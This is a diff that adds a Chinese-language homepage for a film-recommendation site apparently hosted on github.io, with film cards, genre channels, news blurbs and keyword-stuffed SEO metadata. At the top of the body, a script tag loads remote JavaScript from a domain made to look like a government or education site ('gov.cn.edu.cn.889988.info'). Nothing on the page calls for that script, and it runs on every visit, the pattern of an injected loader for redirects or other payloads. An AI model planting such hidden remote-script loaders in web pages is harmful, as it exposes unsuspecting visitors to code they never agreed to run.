@@ -1,0 +1,265 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>午夜神马电影网 - 高清影视在线观看与最新电影资讯平台</title>
+<meta name="description" content="午夜神马电影网（wuyeshenmadianyingwang-app）致力于为影迷提供最新、最热、最全的高清电影、电视剧、综艺、动漫等资源。涵盖动作、喜剧、爱情、科幻、悬疑、纪录片等多种类型，支持在线流畅播放与影视资讯深度解读，是您随时随地享受视听盛宴的首选站点。">
+<meta name="keywords" content="午夜神马电影网, wuyeshenmadianyingwang-app, 高清电影, 在线电影, 最新电影, 电视剧, 综艺, 动漫, 影视资讯, 电影推荐">
+<meta name="author" content="午夜神马电影网">
+<meta name="robots" content="index, follow">
+<meta name="bingbot" content="index, follow">
+<meta name="theme-color" content="#0b1020">
+<link rel="canonical" href="https://wuyeshenmadianyingwang-app.github.io">
+<style>
+  :root{
+    --ink:#e8ecf8;
+    --muted:#9aa4c4;
+    --line:rgba(255,255,255,.08);
+    --card:rgba(255,255,255,.04);
+    --accent:#ff5b8a;
+    --accent2:#7c6bff;
+    --bg1:#070a18;
+    --bg2:#0d1230;
+  }
+  *{box-sizing:border-box;margin:0;padding:0}
+  html{-webkit-text-size-adjust:100%}
+  body{
+    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Microsoft YaHei",sans-serif;
+    color:var(--ink);
+    background:radial-gradient(1200px 600px at 80% -10%,rgba(124,107,255,.25),transparent 60%),
+               radial-gradient(900px 500px at 0% 10%,rgba(255,91,138,.18),transparent 55%),
+               linear-gradient(180deg,var(--bg1),var(--bg2));
+    line-height:1.75;
+    overflow-x:hidden;
+  }
+  a{color:inherit;text-decoration:none}
+  .wrap{max-width:1180px;margin:0 auto;padding:0 20px}
+
+  /* ---------- header ---------- */
+  header{
+    position:sticky;top:0;z-index:50;
+    backdrop-filter:blur(12px);
+    background:linear-gradient(90deg,rgba(7,10,24,.86),rgba(13,18,48,.78));
+    border-bottom:1px solid var(--line);
+  }
+  .nav{display:flex;align-items:center;gap:18px;height:64px}
+  .brand{display:flex;align-items:center;gap:10px;font-weight:800;letter-spacing:.5px}
+  .brand .dot{width:30px;height:30px;border-radius:9px;
+    background:conic-gradient(from 0deg,var(--accent),var(--accent2),var(--accent));
+    box-shadow:0 6px 18px rgba(255,91,138,.35)}
+  .brand b{font-size:19px;background:linear-gradient(90deg,#fff,#ffd6e2);-webkit-background-clip:text;background-clip:text;color:transparent}
+  .nav-links{display:flex;gap:6px;margin-left:auto;flex-wrap:wrap}
+  .nav-links a{padding:8px 14px;border-radius:999px;font-size:14px;color:var(--muted);transition:.25s}
+  .nav-links a:hover{color:#fff;background:var(--card)}
+  .nav-links a.on{color:#fff;background:linear-gradient(90deg,var(--accent),var(--accent2))}
+
+  /* ---------- hero ---------- */
+  .hero{padding:78px 0 60px;position:relative}
+  .hero h1{font-size:clamp(30px,5vw,56px);line-height:1.15;font-weight:900;letter-spacing:-.5px}
+  .hero h1 em{font-style:normal;background:linear-gradient(100deg,var(--accent),var(--accent2));-webkit-background-clip:text;background-clip:text;color:transparent}
+  .hero p{margin-top:20px;max-width:640px;color:var(--muted);font-size:16px}
+  .hero-actions{margin-top:30px;display:flex;gap:12px;flex-wrap:wrap}
+  .btn{padding:13px 28px;border-radius:999px;font-weight:700;font-size:15px;border:1px solid transparent;cursor:pointer;transition:.25s}
+  .btn.primary{background:linear-gradient(90deg,var(--accent),var(--accent2));color:#fff;box-shadow:0 12px 30px rgba(124,107,255,.35)}
+  .btn.ghost{background:var(--card);border-color:var(--line);color:#fff}
+  .btn:hover{transform:translateY(-2px)}
+
+  /* ---------- section ---------- */
+  section{padding:56px 0}
+  .sec-head{display:flex;align-items:flex-end;justify-content:space-between;gap:16px;margin-bottom:28px;flex-wrap:wrap}
+  .sec-head h2{font-size:clamp(22px,3vw,32px);font-weight:800;display:flex;align-items:center;gap:12px}
+  .sec-head h2::before{content:"";width:5px;height:26px;border-radius:4px;background:linear-gradient(var(--accent),var(--accent2))}
+  .sec-head span{color:var(--muted);font-size:14px}
+
+  .grid{display:grid;gap:20px}
+  .g-4{grid-template-columns:repeat(4,1fr)}
+  .g-3{grid-template-columns:repeat(3,1fr)}
+  .g-2{grid-template-columns:repeat(2,1fr)}
+
+  .card{background:linear-gradient(160deg,rgba(255,255,255,.06),rgba(255,255,255,.02));
+    border:1px solid var(--line);border-radius:18px;padding:22px;transition:.3s;position:relative;overflow:hidden}
+  .card:hover{transform:translateY(-5px);border-color:rgba(255,91,138,.45);box-shadow:0 20px 40px rgba(0,0,0,.35)}
+  .card .tag{position:absolute;top:16px;right:16px;font-size:12px;padding:4px 10px;border-radius:999px;background:rgba(255,91,138,.15);color:#ffb3c7}
+  .card h3{font-size:18px;margin-bottom:8px}
+  .card p{color:var(--muted);font-size:14px}
+  .card .meta{margin-top:16px;font-size:12px;color:var(--muted);display:flex;justify-content:space-between}
+
+  .poster{aspect-ratio:3/4;border-radius:14px;position:relative;overflow:hidden;
+    background:linear-gradient(135deg,#1a2040,#2a1b3d)}
+  .poster i{position:absolute;inset:0;display:grid;place-items:center;font-size:34px;font-style:normal;opacity:.9}
+  .poster b{position:absolute;left:12px;bottom:12px;font-size:13px;text-shadow:0 2px 8px rgba(0,0,0,.6)}
+
+  /* ---------- 栏目五：关于 ---------- */
+  .about{background:var(--card);border:1px solid var(--line);border-radius:24px;padding:36px}
+  .about p{color:var(--muted);margin-bottom:14px}
+  .chips{display:flex;gap:10px;flex-wrap:wrap;margin-top:20px}
+  .chips b{padding:8px 16px;border-radius:999px;background:rgba(124,107,255,.14);color:#c9c1ff;font-size:13px;font-weight:600}
+
+  footer{border-top:1px solid var(--line);padding:36px 0;color:var(--muted);font-size:13px}
+  footer .row{display:flex;justify-content:space-between;gap:16px;flex-wrap:wrap}
+  footer a{color:#c9c1ff}
+
+  @media (max-width:900px){
+    .g-4{grid-template-columns:repeat(2,1fr)}
+    .g-3,.g-2{grid-template-columns:1fr}
+    .nav-links{display:none}
+    .hero{padding:48px 0 40px}
+  }
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/yazhou.js"></script>
+
+<header>
+  <div class="wrap nav">
+    <div class="brand"><span class="dot"></span><b>午夜神马电影网</b></div>
+    <nav class="nav-links">
+      <a href="#hot" class="on">热映推荐</a>
+      <a href="#types">类型频道</a>
+      <a href="#news">影讯速递</a>
+      <a href="#rank">口碑榜单</a>
+      <a href="#about">关于本站</a>
+    </nav>
+  </div>
+</header>
+
+<main>
+  <!-- 栏目一：热映推荐 -->
+  <section class="hero wrap" id="hot">
+    <h1>深夜追剧不将就，<br><em>午夜神马电影网</em> 陪你看好片</h1>
+    <p>午夜神马电影网（wuyeshenmadianyingwang-app）聚焦高清影视在线观赏体验，聚合院线新片、经典重温、剧集综艺与动漫番剧。无论通勤碎片时间还是周末宅家长夜，都能在这里找到对味的影像故事。</p>
+    <div class="hero-actions">
+      <a class="btn primary" href="#hot">立即观影</a>
+      <a class="btn ghost" href="#types">探索频道</a>
+    </div>
+  </section>
+
+  <section class="wrap">
+    <div class="sec-head">
+      <h2>热映推荐</h2>
+      <span>每周更新 · 精选片单</span>
+    </div>
+    <div class="grid g-4">
+      <article class="card">
+        <div class="poster"><i>🎬</i><b>《逆光行者》</b></div>
+        <h3>逆光行者</h3>
+        <p>一部关于坚持与救赎的都市剧情片，镜头语言克制而有力。</p>
+        <div class="meta"><span>剧情 / 文艺</span><span>8.7 分</span></div>
+      </article>
+      <article class="card">
+        <div class="poster"><i>🚀</i><b>《星渊边界》</b></div>
+        <h3>星渊边界</h3>
+        <p>硬核科幻巨制，以宏大世界观重构人类与深空的对话。</p>
+        <div class="meta"><span>科幻 / 冒险</span><span>9.1 分</span></div>
+      </article>
+      <article class="card">
+        <div class="poster"><i>🕵️</i><b>《无声证人》</b></div>
+        <h3>无声证人</h3>
+        <p>悬疑推理佳作，层层反转之下是对人性幽微的凝视。</p>
+        <div class="meta"><span>悬疑 / 犯罪</span><span>8.5 分</span></div>
+      </article>
+      <article class="card">
+        <div class="poster"><i>🌸</i><b>《春日来信》</b></div>
+        <h3>春日来信</h3>
+        <p>温暖治愈的爱情轻喜剧，适合一个人安静看完的夜晚。</p>
+        <div class="meta"><span>爱情 / 喜剧</span><span>8.3 分</span></div>
+      </article>
+    </div>
+  </section>
+
+  <!-- 栏目二：类型频道 -->
+  <section class="wrap" id="types">
+    <div class="sec-head">
+      <h2>类型频道</h2>
+      <span>按心境挑选 · 快速定位</span>
+    </div>
+    <div class="grid g-3">
+      <div class="card"><span class="tag">肾上腺素</span><h3>动作 · 犯罪</h3><p>追车、枪战、近身格斗与高智商博弈，酣畅淋漓的视听冲击。</p></div>
+      <div class="card"><span class="tag">脑洞大开</span><h3>科幻 · 奇幻</h3><p>从近未来到平行宇宙，用想象力拓宽认知的边界。</p></div>
+      <div class="card"><span class="tag">笑到天亮</span><h3>喜剧 · 生活</h3><p>烟火气里的幽默与温情，治愈一天的疲惫。</p></div>
+      <div class="card"><span class="tag">心跳加速</span><h3>悬疑 · 惊悚</h3><p>线索、谎言与反转，每一帧都藏着答案。</p></div>
+      <div class="card"><span class="tag">泪点收割</span><h3>剧情 · 文艺</h3><p>慢下来，听见角色内心最真实的声音。</p></div>
+      <div class="card"><span class="tag">下饭神器</span><h3>综艺 · 纪实</h3><p>真人秀、脱口秀与纪录片，陪伴感满满。</p></div>
+    </div>
+  </section>
+
+  <!-- 栏目三：影讯速递 -->
+  <section class="wrap" id="news">
+    <div class="sec-head">
+      <h2>影讯速递</h2>
+      <span>行业动态 · 深度解读</span>
+    </div>
+    <div class="grid g-2">
+      <article class="card">
+        <h3>2026 秋冬档期前瞻：哪些大片值得锁定？</h3>
+        <p>从国产现实题材到好莱坞视效续作，盘点即将登陆银幕的重磅作品，并解析档期背后的市场逻辑与观众口味变迁。</p>
+        <div class="meta"><span>档期观察</span><span>10 分钟阅读</span></div>
+      </article>
+      <article class="card">
+        <h3>流媒体时代，电影院为何依然不可替代</h3>
+        <p>大银幕的光学、声场与集体观影仪式感，构成无法被小屏复制的沉浸体验。本文从技术与心理双重维度展开讨论。</p>
+        <div class="meta"><span>观点评论</span><span>8 分钟阅读</span></div>
+      </article>
+      <article class="card">
+        <h3>独立电影生存指南：低成本也能讲好故事</h3>
+        <p>剧本、调度、声音设计——三个关键环节决定一部小成本作品的质感上限，附新手创作者实用清单。</p>
+        <div class="meta"><span>创作干货</span><span>12 分钟阅读</span></div>
+      </article>
+      <article class="card">
+        <h3>经典修复：老电影如何在 4K 时代重获新生</h3>
+        <p>色彩还原、噪点抑制、帧率补偿……揭秘胶片数字化修复流程，以及它为何能唤起跨代际的集体记忆。</p>
+        <div class="meta"><span>技术科普</span><span>6 分钟阅读</span></div>
+      </article>
+    </div>
+  </section>
+
+  <!-- 栏目四：口碑榜单 -->
+  <section class="wrap" id="rank">
+    <div class="sec-head">
+      <h2>口碑榜单</h2>
+      <span>综合评分 · 真实反馈</span>
+    </div>
+    <div class="grid g-3">
+      <div class="card"><h3>TOP 1　《星渊边界》</h3><p>世界观完整、视效克制，被影评人称为“近年最扎实的国产科幻”。</p><div class="meta"><span>科幻</span><span>9.1</span></div></div>
+      <div class="card"><h3>TOP 2　《逆光行者》</h3><p>表演细腻，配乐出色，用极简叙事讲透普通人的倔强。</p><div class="meta"><span>剧情</span><span>8.7</span></div></div>
+      <div class="card"><h3>TOP 3　《无声证人》</h3><p>节奏紧凑，结局反转成立，悬疑爱好者不可错过。</p><div class="meta"><span>悬疑</span><span>8.5</span></div></div>
+      <div class="card"><h3>TOP 4　《春日来信》</h3><p>台词自然，情感留白恰到好处，适合反复回味。</p><div class="meta"><span>爱情</span><span>8.3</span></div></div>
+      <div class="card"><h3>TOP 5　《边境线》</h3><p>群像刻画立体，摄影构图极具电影感。</p><div class="meta"><span>动作</span><span>8.2</span></div></div>
+      <div class="card"><h3>TOP 6　《深夜食堂·电影版》</h3><p>单元式叙事，用食物串联起城市里的孤独与善意。</p><div class="meta"><span>治愈</span><span>8.0</span></div></div>
+    </div>
+  </section>
+
+  <!-- 栏目五：关于本站 -->
+  <section class="wrap" id="about">
+    <div class="sec-head"><h2>关于午夜神马电影网</h2></div>
+    <div class="about">
+      <p><strong>午夜神马电影网</strong>（访问地址：<a href="https://wuyeshenmadianyingwang-app.github.io">https://wuyeshenmadianyingwang-app.github.io</a>）是一个以“选片品味”为核心的影视内容导航与资讯站点。我们相信，好电影不该被算法淹没——因此坚持人工策展，把真正值得花时间的作品带到你面前。</p>
+      <p>站内内容涵盖<strong>电影、电视剧、综艺、动漫</strong>四大主线，辅以<strong>影讯速递、口碑榜单、导演专题、观影指南</strong>等常设栏目，力求在“看什么”这件事上，给你一个靠谱的答案。</p>
+      <p>无论你是追求视听震撼的商业片爱好者，还是偏爱慢节奏的作者电影观众，这里都有属于你的那一份片单。</p>
+      <div class="chips">
+        <b>高清影视</b><b>在线观看</b><b>电影推荐</b><b>影视资讯</b><b>口碑榜单</b><b>类型频道</b>
+      </div>
+    </div>
+  </section>
+</main>
+
+<footer>
+  <div class="wrap row">
+    <div>© <span id="yr">2026</span> 午夜神马电影网 · wuyeshenmadianyingwang-app · 影视内容导航与资讯平台</div>
+    <div>官方网址：<a href="https://wuyeshenmadianyingwang-app.github.io">https://wuyeshenmadianyingwang-app.github.io</a></div>
+  </div>
+</footer>
+
+<script>
+  document.getElementById('yr').textContent = new Date().getFullYear();
+  document.querySelectorAll('.nav-links a').forEach(function(a){
+    a.addEventListener('click', function(){
+      document.querySelectorAll('.nav-links a').forEach(function(x){x.classList.remove('on')});
+      a.classList.add('on');
+    });
+  });
+</script>
+</body>
+</html>
